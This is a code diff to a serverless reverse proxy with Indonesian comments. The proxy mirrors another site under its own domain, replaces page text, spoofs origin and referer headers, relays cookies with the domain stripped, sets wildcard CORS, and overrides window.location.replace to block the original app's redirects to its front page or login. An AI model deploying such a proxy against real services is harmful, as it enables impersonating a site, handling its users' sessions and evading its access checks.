@@ -27,7 +27,6 @@ function stripCookieDomain(cookie) {
   return cookie.replace(/;\s*domain=[^;]*/gi, "");
 }
 
-// Script client: ganti teks, belokkan fetch, paksa / ke /home
 function buildClientScript() {
   return `<script>(function(){
   var ORIGIN = ${JSON.stringify(TARGET_ORIGIN)};
@@ -40,7 +39,15 @@ function buildClientScript() {
     return;
   }
 
-  // 2. BELOKKAN SEMUA REQUEST KE PROXY
+  // 2. CEGAH DITENDANG BALIK KE HALAMAN DEPAN
+  // Kalau aplikasi aslinya nyoba nge-redirect kita ke "/", kita blokir!
+  var _replace = window.location.replace;
+  window.location.replace = function(url) {
+    if (url === "/" || url === "" || url.includes("login")) return; 
+    return _replace.apply(window.location, arguments);
+  };
+
+  // 3. BELOKKAN SEMUA REQUEST KE PROXY
   function rewriteUrl(u) {
     if (typeof u !== "string") return u;
     if (u.indexOf(ORIGIN) === 0) return u.slice(ORIGIN.length) || "/";
@@ -64,7 +71,7 @@ function buildClientScript() {
     return _open.apply(this, a);
   };
 
-  // 3. GANTI TEKS DI DOM
+  // 4. GANTI TEKS DI DOM
   function renameText(t) {
     for (var i = 0; i < REPLACEMENTS.length; i++) {
       var p = REPLACEMENTS[i];
@@ -120,17 +127,26 @@ function buildClientScript() {
 }
 
 export default async function handler(req, res) {
+  // ====== 0. HANDLE CORS (Biar "Load failed" hilang) ======
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "*");
+  
+  if (req.method === "OPTIONS") {
+    res.statusCode = 204;
+    return res.end();
+  }
+
   try {
-    // 1. Ambil Path dan Query String
-    const path = req.query.path || "";
+    let path = req.query.path || "";
     
     // Server-side redirect kalau buka root
     if (path === "" || path === "/" || path === "index.html") {
-      res.writeHead(302, { Location: "/home" });
+      res.writeHead(302, { Location: "/home", "Cache-Control": "no-store" });
       return res.end();
     }
 
-    // Rekonstruksi URL asli (termasuk query string)
+    // Rekonstruksi URL (termasuk query string)
     const searchParams = new URLSearchParams();
     for (const [key, value] of Object.entries(req.query)) {
       if (key !== "path") searchParams.append(key, value);
@@ -138,7 +154,7 @@ export default async function handler(req, res) {
     const query = searchParams.toString() ? `?${searchParams.toString()}` : "";
     const targetUrl = `${TARGET_ORIGIN}/${path}${query}`;
 
-    // 2. Teruskan SEMUA header (kecuali host & connection) biar API jalan
+    // Teruskan semua header
     const fwd = {};
     for (const [key, value] of Object.entries(req.headers)) {
       if (!["host", "connection", "content-length"].includes(key.toLowerCase())) {
@@ -146,14 +162,13 @@ export default async function handler(req, res) {
       }
     }
     
-    // Spoof referer & origin biar server asli ngira ini request internal
     fwd["origin"] = TARGET_ORIGIN;
     if (req.headers["referer"]) {
       const ourOrigin = `https://${req.headers["host"]}`;
       fwd["referer"] = req.headers["referer"].replace(ourOrigin, TARGET_ORIGIN);
     }
 
-    // 3. Handle Body (JSON / Form / Text)
+    // Handle Body
     let body;
     if (!["GET", "HEAD"].includes(req.method)) {
       if (req.body === undefined) {
@@ -171,7 +186,6 @@ export default async function handler(req, res) {
       }
     }
 
-    // 4. Fetch ke server asli
     const upstream = await fetch(targetUrl, {
       method: req.method,
       headers: fwd,
@@ -179,7 +193,7 @@ export default async function handler(req, res) {
       redirect: "manual",
     });
 
-    // 5. Teruskan Cookie
+    // Teruskan Cookie
     let setCookies = [];
     if (typeof upstream.headers.getSetCookie === "function") {
       setCookies = upstream.headers.getSetCookie();
@@ -191,7 +205,7 @@ export default async function handler(req, res) {
       res.setHeader("set-cookie", setCookies.map(stripCookieDomain));
     }
 
-    // 6. Handle Redirect dari server asli
+    // Handle Redirect dari server asli
     if ([301, 302, 303, 307, 308].includes(upstream.status)) {
       const loc = upstream.headers.get("location") || "/";
       const rel = loc.startsWith(TARGET_ORIGIN) ? loc.slice(TARGET_ORIGIN.length) || "/" : loc;
@@ -201,7 +215,7 @@ export default async function handler(req, res) {
 
     const ct = upstream.headers.get("content-type") || "";
 
-    // 7. Proses HTML (Ganti teks & suntik script)
+    // Proses HTML
     if (ct.includes("text/html")) {
       let html = await upstream.text();
       html = renameInHtmlTextNodes(html);
@@ -217,7 +231,7 @@ export default async function handler(req, res) {
       return res.end(html);
     }
 
-    // 8. File statis (JS, CSS, Gambar) - Passthrough
+    // File statis (JS, CSS, Gambar)
     const buf = Buffer.from(await upstream.arrayBuffer());
     res.statusCode = upstream.status;
     res.setHeader("content-type", ct || "application/octet-stream");
